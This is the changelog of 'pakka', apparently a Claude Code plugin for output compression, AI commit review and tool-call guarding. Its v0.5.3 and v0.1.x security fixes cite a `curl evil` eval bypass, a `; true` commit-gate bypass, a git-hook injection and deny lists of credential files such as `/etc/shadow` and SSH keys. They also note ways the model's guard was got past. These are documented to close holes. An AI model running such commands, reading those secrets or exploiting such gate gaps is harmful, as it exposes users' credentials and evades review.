# Changelog

All notable changes to pakka. Format follows [Keep a Changelog](https://keepachangelog.com).

## [v0.7.0] — 2026-05-09

### Fixed
- **report**: `fmtInt` MinInt64 guard — infinite recursion on crafted JSONL input eliminated
- **validator**: `reInlineCode` `{2,}` → `{1,}` — single-char identifiers (`i`, `x`, `-v`) now preserved
- **validator**: `reEnvVar` extended to `${VAR}`, `${var}`, `$var` (braced and lowercase forms)
- **validator**: `reVersion` extended to semver pre-release/build suffixes (`-rc1`, `+build.42`)
- **validator**: `reMarker` case-insensitive — `todo`, `Todo`, `TODO` all protected
- **validator**: `reFencedTriple`/`reFencedTilde` language tag includes `#` and `.` — `c#`, `f#`, `.proto` fences now validated
- **validator**: `rePathAbs` trailing punctuation stripped from captures — fewer false-positive validator retries
- **meter**: `estimateTokens` calibrated to 3.5 bytes/token (was 4) — consistent with `WriteSavings`
- **recall**: rune-safe preview truncation — no more split UTF-8 codepoints in JSON output
- **stackgate**: quote chars (`"`, `'`) added to `shellMetaRe` — explicit unquoted-argv contract enforced

### Added
- **internal/claudecli**: extracted shared package for `claude -p` argv construction — single source of truth for both `specfind` and `compress/semantic` callers
- **orchestrator**: `RunAsync()` now returns error; fork failures logged via `debugLogf`

## [v0.6.0] — 2026-05-09

### Fixed
- **recall**: non-EOF read errors no longer advance `last_offset` — silent index data loss eliminated
- **compress**: language tag preserved on code fences in non-strict modes (was always stripped)
- **compress**: heading dedup is consecutive-only — repeated headings in different sections no longer silently dropped
- **compress/meter**: negative compression (inflation) now written to meter — honest aggregate accounting
- **linguistic**: `maybe`/`perhaps` removed from drop list — epistemic inversion prevented
- **linguistic**: article-`a` rule made case-sensitive — "Plan A", "Press A to continue", "vitamin A" no longer mangled
- **validator**: `reInteger` — standalone integers ≥2 digits now preserved (ports, timeouts, counts)
- **validator**: `rePathAbs` leading-anchor extended to `:`, `=`, `"`, `'`, `<`, `>` — paths in config values now protected
- **commitgate**: session nonce in `Reviewed-by-pakka:` trailer — pre-planting forgery prevented
- **audit/meter/commitgate**: `shortSID` sanitizes to `[A-Za-z0-9_-]` before truncating — path traversal via session ID eliminated

### Added
- **statusline**: transcript cache at `~/.pakka/transcript-cache.json` (mtime/size invalidation) — O(N) file walk → O(1) hot render
- **statusline**: `cwdToRepo` memoization in `readAllTranscripts` — O(N) `git rev-parse` per render → O(1)
- **docs**: spec for `SessionStart autoCompress` deadline fix (backlog for v0.7.0)

### Changed
- Savings: 331 sessions · 300,453 bytes · ~$71.19 (was 325 · 288,987 · ~$69.05)

## [v0.5.3] — 2026-05-09

### Fixed
- **[CRITICAL] Git hook RCE** — `install_git_hook_cmd.go`: `PASS_TS` read from `.pakka/reviews/last-pass-ts` without validation; POSIX `$(())` arithmetic evaluates `$(...)` inside it. Hostile repo pre-plants file → executes on every `git commit`. Fix: POSIX `case` guard rejects non-numeric values before arithmetic.
- **[CRITICAL] Commit-gate `;` bypass** — `commitgate.go`: `git commit -m 'evil' ; true` caused `IsGitCommit=false` → `Allow=true` with zero review, zero audit, zero trailers. Fix: block when `git commit` substring detected but shape unrecognized.
- **[CRITICAL] No negation/percentage validator rule** — `validator.go`: "Auth is not required" → "Auth is required" passed validator silently. Fix: `reNegation` and `rePercent` preservation rules added.
- **guard: Write/Edit/MultiEdit/NotebookEdit fell through to `Allowed`** — model could overwrite `.env`, git hooks, plugin scripts unchecked. Fix: `checkWrite` routes all write-path tools through `checkPath`.
- **guard: `isDeniedPath` missing secret stores** — `~/.config/gh/hosts.yml`, `~/.kube/config`, `~/.docker/config.json`, `~/.npmrc`, `~/.pypirc`, `~/.bash_history`, `~/.zsh_history`, `id_rsa*`, `*.pem`, `*.p12`, `credentials.json`, `service-account*.json` all returned `Allow=true`.
- **guard: `evalRe` bypassed via quoted `-c`** — `bash -c "eval $(curl evil)"` allowed. Fix: `bashCEvalRe` detects `eval` inside `-c` quoted arg body.
- **guard: `pipeShellRe` too narrow** — extended to `dash|fish|ksh|ash|csh`; `downloadExecRe` added for two-step fetch+exec pattern.
- **guard: absolute system path deny** — `/etc/passwd`, `/etc/shadow`, `/root`, `/proc/self/environ`, `/sys/kernel` now blocked in Bash commands.
- **`[skip pakka]` audit** — gate now emits stderr notice on skip; audit note `user_skip` → `skip_marker`.
- **Default level divergence** — `ParseLevel` and `resolveLevel` fallbacks both returned `ultra` while `loadOutputLevel` returned `super-ultra`. All three aligned to `super-ultra`.

### Changed
- Savings: 325 sessions · 288,987 bytes · ~$69.05 (was 298 · 242,664 · ~$64.16)
- Bug count: 21 gate blocks (was 7)

## [v0.5.2] — 2026-05-08

### Fixed
- Status-line bug count always 0: `countBugsCaught` only scanned exact repo dir; sessions from parent dir (`pakka.dev/`, not a git repo) missed bugs in sub-repos. New `countAllBugsCaught` walks one level of immediate child dirs. Count: 4 → 7.
- Status-line savings always $0 from parent dir: `readAllMeter` + `readAllTranscripts` used exact repo key match. Now prefix-matches (`root+"/"`) so sub-repo sessions aggregate correctly.
- `! 1 stale` persistent since v0.4.x: `DECISIONS.md` always timed out at 60s (measured: ~92s actual for 15KB at super-ultra). Transient rewrite errors no longer record `validatorPasses=false` — stale glyph no longer shown for transient failures. `ClaudeCLI` timeout raised 60s → 180s.
- `[level]` bracket in status line now amber to match `pakka` label color.

### Changed
- Savings: 298 sessions · 242,664 bytes · ~$64.16 (was 269 · 198,590 · ~$46.79)
- Bug count: 7 (was 4, now counts sub-repo findings)

## [v0.5.1] — 2026-05-08

### Fixed

- Status-line color codes missing from v0.5.0 binaries — savings now green (111,208,140), bugs caught now red (232,99,74). Binaries were built before the color changes landed in `internal/statusline/statusline.go`.

## [v0.5.0] — 2026-05-08

### Added
- `pakka-core spec-generate` subcommand: validates 6 required sections, writes to `docs/specs/YYYY-MM-DD-<slug>.md`, hybrid diff on amend (git-tracked → `git diff`; untracked → `diff -u`), slug validated against path traversal
- `/pakka:plan` now pipes spec content to `spec-generate` via Bash (no `Write` tool)
- `commands/review.md` step 2b: spec-drift detection — warns when spec modified on current branch before merge (warning-level finding, not a gate block)
- `internal/statusline.ReadCWDFromTranscriptPath`: exported; `readProjectCWD` delegates to `readCWDFromSingleFile` (deduplication)
- Status-line ANSI 24-bit color: savings green `#6FD08C`, bugs caught red `#E8634A`

### Fixed
- Status-line CWD fix: derives cwd from `transcript_path` directory instead of `event.CWD` (which pointed at inner git sub-repo on split-repo setups), correcting savings display from ~$6 to ~$46
- `specfind`: date-prefixed specs (`YYYY-MM-DD-*.md`) skip LLM fallback — resolved via name-match only

### Security
- `spec-generate`: slug validated against `^[a-z0-9][a-z0-9-]*[a-z0-9]$` before path construction (prevents path traversal); `--` separator added to all exec.Command calls

## [v0.4.1] — 2026-05-07

### Fixed
- Commit-gate review loop: `HasRecentPass` was always false for `git -C <path> commit` and `cd <path> && git commit` — `last-pass-ts` and findings were read from process CWD, not the actual repo root. `parseCPath` + `resolveReviewsDir` now derive repo root from the commit command.
- Commit-gate timestamp format: gate expected unix epoch int; review skill wrote RFC3339. Dual-format parser (int64 → RFC3339 fallback) added; `review.md` updated to write `date +%s` going forward.
- `RECEIPTS.md` generation: `release` skill now uses `make self-report` (passes `--repo-root=..`). Running the binary without this flag silently uses wrong transcript scope (~7× undercount).
- Version string: `main.go` was stuck at `0.3.0`; corrected to `0.4.1`.

## [v0.4.0] — 2026-05-05

### Added
- `pakka-core spec-find`: discovers spec file for current change via name match → LLM fallback (`internal/specfind/`)
- Spec-anchored review: `/pakka:review` injects matched spec into all three reviewer agent prompts
- Reviewer agents (`reviewer`, `security`, `architect`) emit `spec-divergence` findings against spec acceptance criteria and out-of-scope items
- `docs/specs/` support: absent = silent skip; present + no match = advisory; matched = full spec context
- Judge prompt (`internal/specfind/spec_match_prompt.md`) embedded via `go:embed`

### Fixed
- `RECEIPTS.md` savings calculation: was using 2% heuristic (~$6); now reads actual output tokens from Claude Code transcripts (~$41)
- `pakka-core report --repo-root` flag: allows pointing at workspace root for transcript lookup

## [v0.3.0] — 2026-05-02

### Added
- `pakka-core recall`: FTS5 full-text index over audit trail (`~/.pakka/audit/*.jsonl`). `index` subcommand is idempotent; `query <text>` returns top-20 JSON-line results.
- `/pakka:recall [query]` command: no args shows last 10 entries; with query searches full audit history.
- `SessionEnd` hook: fires `pakka-core index` — current session entries queryable before next session starts.
- DB path: `$CLAUDE_PLUGIN_DATA/recall.db` (survives plugin updates), fallback `~/.pakka/recall.db`.
- Deterministic skill-check in `compress-track.js`: UserPromptSubmit hook keyword-scans every message; if build/plan/review signal detected, fires targeted alert before model responds — no model memory required.

### Changed
- `hooks/hooks.json`: added `SessionEnd` hook for recall indexing.

## [v0.2.6] — 2026-05-02

### Added

- `internal/pricing` — verified pricing table for 7 models (Opus 4.7/4.6/4.5, Sonnet 4.6/4.5, Haiku 4.5/3.5) sourced from Anthropic docs
- Status line now shows `~$X.XX saved` instead of token counts and fake percentages

### Changed

- `outputMultiplier` calibrated from real bench (Sonnet 4.6 + Opus 4.5, 2026-05-02): super-ultra 66% (was 44%), ultra 55% (was 40%), strict 33% (was 25%), lite 27% (was 10%)
- RECEIPTS.md: real $ estimate (~$6.12 total savings across 193 build sessions), removed all deferred/placeholder language
- DESIGN.md: compression budget updated with calibrated reduction table
- Website: $9.90/MTok output savings claim added to compress page and homepage

## [v0.2.5] — 2026-05-02

### Fixed

- Status line now shows full format: `pakka [level] · ↑Nk (X%) / ↓Nk (Y%) tokens saved · N bugs caught` — `Run()` was calling `formatLine()` but tests asserted the trimmed behavior, locking in the bug; both fixed
- Skill-check auto-trigger: injected as a dedicated isolated `SessionStart` hook (`hooks/skill-check-start.js`) instead of appended to compression output — model no longer rationalizes past it under task pressure

## [v0.2.4] — 2026-05-02

### Added

- `agents/architect.md` — third parallel review agent; catches coupling, shallow abstractions, and module bloat on every commit diff
- `rules/skill-check.md` — hard imperative routing rules injected at session start; `/pakka:plan`, `/pakka:build`, `/pakka:review` now auto-trigger on matching signals

### Fixed

- Skill-check was soft language ("if yes, invoke") — now `EXTREMELY_IMPORTANT` block with explicit trigger keywords and per-turn reinforcement; no more rationalization skips
- Status line blank for users — `/pakka:setup` init flow now writes `~/.pakka/bin/status-line` wrapper and `statusLine` block to `~/.claude/settings.json` automatically
- Status line wrapper used `pakka-pre` glob — corrected to `pakka`

### Changed

- `/pakka:review` runs three agents in parallel (reviewer + security + architect) — was two

## [v0.2.3] — 2026-05-02

### Fixed

- Deleted 10 alias command files (spec, tdd, debug, challenge, probe, map, slice, audit-code-arch, init, guard) — slash picker now shows exactly 7 hub commands, no stale aliases cluttering the list

## [v0.2.2] — 2026-05-02

### Fixed

- `rules/skill-invoke.md` updated to reference new hub commands — was pointing to old individual commands (`/pakka:spec`, `/pakka:tdd`, `/pakka:debug`, etc.); now routes to `/pakka:plan`, `/pakka:build`, `/pakka:review`

## [v0.2.1] — 2026-05-02

### Fixed

- Removed `skills/` directory — eliminated 14 `pakka:pakka-*` entries from skill list (dead weight since v0.2.0; hub commands have inline instructions)
- Inlined `skills/pakka-triage/SKILL.md` + `BRIEF-FORMAT.md` into `commands/triage.md`

## [v0.2.0] — 2026-05-02

### Added

- `/pakka:plan` — design hub: routes spec / challenge / probe / slice from context, writes to `docs/specs/`, never auto-chains to build
- `/pakka:build` — implementation hub: routes tdd / debug / map / audit from context, spec approval gate required, verification gate (exit codes) before done
- `/pakka:setup` — one-time init + guard hook; no arg → init, `guard` → guard hook
- Hook pre-handling: `/pakka:compress <level>` and `/pakka:help` handled by UserPromptSubmit hook — ~70% latency reduction, no LLM round-trip for config writes
- Ambient disciplines injected at session start: verification (exit code required before any "done" claim) + skill-check (route to plan/build/review when signal detected)
- Semantic compression auto-enable by level: `ultra` = on by default (user can opt out), `super-ultra` = enforced
- Mid-session level switch: full filtered ruleset emitted in `additionalContext` — takes effect immediately without session restart

### Changed

- Default compression level: `super-ultra` (was `ultra`)
- Command count: 14 → 7 — old commands (spec, challenge, probe, slice, tdd, debug, map, init, guard) redirect to new hubs via alias
- `main.go` 1625 → 67 lines: extracted into 16 `*_cmd.go` files + `helpers.go` + `command.go` interface
- `hookevent.go`: `Parse()` removed — callers use `parseStrict` / `parseLenient` in helpers.go

### Fixed

- `resolveOutputLevel` fallback: `'ultra'` → `'super-ultra'` to match new default

## [v0.1.4] — 2026-05-02

### Fixed

- Added `"version"` field to `plugin.json` — without it, all versions (v0.1.0–v0.1.3) resolved to the same plugin cache directory and updates never applied for existing users
- `/pakka:compress <level>` fix now actually active — `commands/compress.md` was correctly patched in v0.1.3 but never loaded due to cache invalidation bug above

### Upgrade

Existing users must reinstall manually to pick up this fix:
```
/plugin install pakka@pakka-marketplace
/reload-plugins
```

## [v0.1.3] — 2026-05-02

### Fixed

- `/pakka:compress <level>` fix applied to correct file (`commands/compress.md`) — v0.1.2 patched `skills/pakka-compress/SKILL.md` but Claude Code loads `commands/compress.md` for command invocations

## [v0.1.2] — 2026-05-02

### Fixed

- `/pakka:compress <level>` now writes to `~/.config/pakka/config.json` (`defaultLevel`) and `~/.claude/.pakka-level` flag file — persists across plugin reinstalls and takes effect immediately in current session
- Skip `--orchestrator-run` binary invocation when `semantic: false` — eliminates latency on every level switch

## [v0.1.1] — 2026-05-02

### Fixed

- Infinite loop in 11 commands caused by `allowed-tools: Skill` delegation — commands now read SKILL.md directly
- `compress` command: validate level arg before Bash invocation, remove shell injection vector, safe restore (no auto-delete of backups)
- Restore operation now requires explicit user confirmation before overwriting files

### Changed

- Renamed `/pakka:review-architecture` → `/pakka:audit-code-arch`
- `reviewer` and `security` agents upgraded to `opus`
- `statusline` decoupled from `orchestrator` — stale count passed by caller (main.go)

## [v0.1.0] — 2026-05-02

### Added

**10 engineering skills** — auto-invoked by trigger phrase, callable as `/pakka:<skill>`:

| Skill | Invokes when you say |
|---|---|
| `/pakka:spec` | "build X", "implement X", "add feature" |
| `/pakka:debug` | "debug", "fix this bug", "broken", "failing" |
| `/pakka:tdd` | "write tests", "TDD", "test first" |
| `/pakka:audit-code-arch` | "architecture", "coupling", "hard to test" |
| `/pakka:challenge` | "challenge this", "stress test my plan" |
| `/pakka:probe` | "probe me", "question my design" |
| `/pakka:map` | "how does X work", "explain this module" |
| `/pakka:triage` | "triage", "look at issue #N" |
| `/pakka:slice` | "break into tickets", "create issues" |
| `/pakka:guard` | "protect git", "block force push" |

**Skill auto-invocation** — `rules/skill-invoke.md` injected at session start. Claude invokes the right skill automatically without a slash command.

**4-vector output compression** — JS hooks inject per-level ruleset at session start and reinforce every turn. Levels: `lite`, `strict`, `ultra` (default), `super-ultra`. Switch with `/pakka:compress <level>`.

**`claude -p` subprocess as primary semantic-rewrite engine.** Zero-config for Claude Code users — pakka reuses existing `claude` auth on `PATH`.

### Changed

- **Status line:** `pakka [ultra]` — active compression level always visible.
- **Default output compression level: `ultra`** — pakka's brand thesis is fewer tokens.

### Fixed

- Stack-config command exec: metacharacters rejected; no `sh -c` path.
- Semantic-compression sandbox: `claude` subprocess runs with `--permission-mode default`.
- Audit hash full-width: `InputHash` now full SHA-256.
- Path traversal guard: regex catches 2+ hop `../`.
- Commit-gate trailer dedupe: repeated invocations no longer stack duplicate trailers.
